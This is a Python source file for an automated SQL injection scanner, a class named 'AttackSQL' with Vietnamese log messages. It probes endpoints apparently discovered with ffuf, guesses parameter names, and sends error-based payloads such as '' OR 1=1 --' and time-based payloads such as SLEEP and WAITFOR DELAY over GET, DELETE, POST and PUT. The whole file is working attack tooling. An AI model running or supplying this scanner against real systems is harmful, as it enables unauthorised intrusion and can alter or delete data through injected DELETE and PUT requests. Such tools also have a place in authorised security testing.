import time
import requests
 
class AttackSQL:
    def __init__(self, api_client, base_url=""):
        self.client = api_client
        self.base_url = base_url.rstrip('/')
        
        self.error_signatures = ["sql syntax", "mysql_fetch_array", "native client", "ora-", "postgre", "sqlite3"]
        
        self.common_params = ["id", "search", "q", "query", "user", "username", "limit", "offset", "status", "category", "uuid"]
        
        self.payloads = {
            "error_based": [
                "' OR 1=1 --",
                "' OR '1'='1",
                "admin' --",
                "' UNION SELECT 1,2,3 --"
            ],
            "time_based": [
                "' OR SLEEP(5) --",
                "'; SELECT PG_SLEEP(5) --",
                "'; WAITFOR DELAY '0:0:5' --",
                "' OR RANDOMBLOB(500000000) --" 
            ]
        }
 
    def _check_error_signatures(self, response):
        if response is not None and hasattr(response, 'text'):
            for sig in self.error_signatures:
                if sig in response.text.lower():
                    return True
        return False
 
    def auto_scan_endpoint(self, endpoint): 
        print(f"ĐANG PHÂN TÍCH ENDPOINT ẨN TỪ FFUF: {endpoint}")
 
        for param in self.common_params:
            for method in ["GET", "DELETE"]:
                test_params = {param: "1"}
                try:
                    response = self.client.send_request(
                        method, endpoint, params=test_params, timeout=3
                    )
                    if response is not None and response.status_code in [200, 204, 400]:
                        print(f" -> [Phát hiện] Tham số hợp lệ qua URL | Method: {method} | Param: '{param}'")
                        self.test_sqli(method=method, endpoint=endpoint, param_name=param)
                except requests.RequestException:
                    pass
 
            for method in ["POST", "PUT"]:
                test_json = {param: "1"}
                try:
                    response = self.client.send_request(
                        method, endpoint, json=test_json, timeout=3
                    )
                    if response is not None and response.status_code in [200, 201, 400]:
                        print(f" -> [Phát hiện] Tham số hợp lệ qua JSON Body | Method: {method} | Param: '{param}'")
                        self.test_sqli(method=method, endpoint=endpoint, param_name=param, is_json=True)
                except requests.RequestException:
                    pass
 
    def test_sqli(self, method, endpoint, param_name, static_data=None, is_json=False):
        method = method.upper()
        if static_data is None:
            static_data = {}
 
        print(f"\nKHỞI CHẠY QUÉT | {method} | {endpoint} | Tham số: {param_name}")
 
        # VÒNG 1: Error-based
        print("--- [Vòng 1] Kiểm tra lỗi hiển thị (Error-based) ---")
        error_found = False
        for payload in self.payloads["error_based"]:
            test_data = static_data.copy()
            test_data[param_name] = payload
            
            kwargs = {"method": method, "endpoint": endpoint}
            if method in ["GET", "DELETE"]:
                kwargs["params"] = test_data
            else:
                kwargs["json"] = test_data if is_json else None
                kwargs["data"] = None if is_json else test_data
 
            response = self.client.send_request(**kwargs)
            
            if self._check_error_signatures(response):
                print(f"PHÁT HIỆN LỖI (Error-based): CSDL rò rỉ thông báo lỗi với payload: {payload}")
                error_found = True
                break
 
        if error_found:
            return
 
        # VÒNG 2: Time-based
        print("--- [Vòng 2] Kiểm tra độ trễ thời gian (Time-based) ---")
        for payload in self.payloads["time_based"]:
            test_data = static_data.copy()
            test_data[param_name] = payload
            
            kwargs = {"method": method, "endpoint": endpoint}
            if method in ["GET", "DELETE"]:
                kwargs["params"] = test_data
            else:
                kwargs["json"] = test_data if is_json else None
                kwargs["data"] = None if is_json else test_data
 
            start_time = time.time()
            response = self.client.send_request(**kwargs)
            elapsed_time = time.time() - start_time
            
            if elapsed_time >= 4.5:
                print(f"PHÁT HIỆN LỖI (Time-based): Delay bất thường ({elapsed_time:.2f}s) với payload: {payload}")
                break
            else:
                print(f"Payload an toàn ({elapsed_time:.2f}s): {payload}")